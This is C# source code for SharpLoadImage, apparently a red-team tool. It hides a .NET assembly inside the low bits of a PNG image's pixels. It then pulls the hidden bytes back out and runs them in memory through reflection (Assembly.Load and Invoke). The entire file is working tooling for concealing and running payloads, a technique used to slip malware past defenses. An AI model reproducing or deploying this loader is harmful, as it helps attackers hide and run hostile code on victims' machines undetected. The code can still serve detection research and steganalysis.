﻿//
// Authosìr: B4rtik (@b4rtik)
// Project: SharpLoadImage (https://github.com/b4rtik/SharpLoadImage)
// License: BSD 3-Clause

using System;
using System.Text;
using System.Drawing;
using NDesk.Options;
using System.IO;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Linq;

namespace SharpLoadImage
{
    class Program
    {
        static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("usage: SharpLoadImage -a [path to assembly] -i [path to image source] -o [path to output file]");
            Console.WriteLine();
            Console.WriteLine("Options:");
            p.WriteOptionDescriptions(Console.Out);
        }

        static void Main(string[] args)
        {
            string assemblypath = "";
            string image = "";
            string outputfile = "";
            bool showHelp = false;
            
            var p = new OptionSet() {
                { "a|assembly=", "Assembly to hide.\n", v => assemblypath = v },
                { "i|image=", "Image src.", v => image = v },
                { "o|output=", "Output file", v => outputfile = v },
                { "h|help",  "Show this message and exit.", v => showHelp = v != null },
            };

            try
            {
                try
                {
                    p.Parse(args);
                }
                catch (OptionException e)
                {
                    Console.WriteLine(e.Message);
                    Console.WriteLine("Try '--help' for more information.");
                    return;
                }

                if (showHelp)
                {
                    ShowHelp(p);
                    return;
                }

                //Payload to work
                byte[] payload = File.ReadAllBytes(assemblypath);

                Bitmap img = new Bitmap(image);

                int width = img.Size.Width;
                int height = img.Size.Height;

                //Lock the bitmap in memory so it can be changed programmatically.
                Rectangle rect = new Rectangle(0, 0, width, height);
                BitmapData bmpData = img.LockBits(rect, ImageLockMode.ReadWrite, img.PixelFormat);
                IntPtr ptr = bmpData.Scan0;

                // Copy the RGB values to an array for easy modification
                int bytes = Math.Abs(bmpData.Stride) * img.Height;
                byte[] rgbValues = new byte[bytes];
                Marshal.Copy(ptr, rgbValues, 0, bytes);

                //Check that the payload fits in the image 
                if(bytes/2 < payload.Length) {
                    Console.Write("Image not large enough to contain payload!");
                    img.UnlockBits(bmpData);
                    img.Dispose();
                    return;
                }

                //Generate a random string to use to fill other pixel info in the picture.
                string randstr = RandomString(128);
                byte[] randb = Encoding.ASCII.GetBytes(randstr);

                //loop through the RGB array and copy the payload into it
                for (int counter = 0; counter < (rgbValues.Length) / 3; counter++) {
                    int paybyte1;
                    int paybyte2;
                    int paybyte3;
                    if (counter < payload.Length){
                        paybyte1 = (int)Math.Floor((decimal)(payload[counter] / 16));
                        paybyte2 = (payload[counter] & 0x0f);
                        paybyte3 = (randb[(counter + 2) % 109] & 0x0f);
                    } else {
                        paybyte1 = (randb[counter % 113] & 0x0f);
                        paybyte2 = (randb[(counter + 1)% 67] & 0x0f);
                        paybyte3 = (randb[(counter + 2)% 109] & 0x0f);
                    }
                    rgbValues[(counter * 3)] = (byte)((rgbValues[(counter * 3)] & 0xf0) | paybyte1);
                    rgbValues[(counter * 3 + 1)] = (byte)((rgbValues[(counter * 3 + 1)] & 0xf0) | paybyte2);
                    rgbValues[(counter * 3 + 2)] = (byte)((rgbValues[(counter * 3 + 2)] & 0xf0) | paybyte3);
                }

                //Copy the array of RGB values back to the bitmap
                Marshal.Copy(rgbValues, 0, ptr, bytes);
                img.UnlockBits(bmpData);

                //Write the image to a file
                img.Save(outputfile, ImageFormat.Png);
                img.Dispose();

                ExecuteAssembly(outputfile, payload.Length);

            }
            catch (Exception e)
            {
                Console.WriteLine("[x] error: " + e.Message);
                Console.WriteLine("[x] error: " + e.StackTrace);
            }
        }

        private static void ExecuteAssembly(string imgfile, int payloadlength)
        {
            Bitmap g = new Bitmap(imgfile);

            int width = g.Size.Width;

            int rows = (int)Math.Ceiling((decimal)payloadlength / width);
            int array = (rows * width);
            byte[] o = new byte[array];

            int lrows = rows;
            int lwidth = width;
            int lpayload = payloadlength;

            for (int i = 0; i < lrows; i++)
            {
                for (int x = 0; x < lwidth; x++)
                {
                    Color pcolor = g.GetPixel(x, i);
                    o[i * width + x] = (byte)(Math.Floor((decimal)(((pcolor.B & 15) * 16) | (pcolor.G & 15))));
                }
            }

            //o contain payload
            byte[] otrue = new byte[lpayload];
            Array.Copy(o, otrue, lpayload);

            Assembly assembly = Assembly.Load(otrue);
            assembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[0]);
        }

        private static string RandomString(int length)
        {
            Random random = new Random();
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}
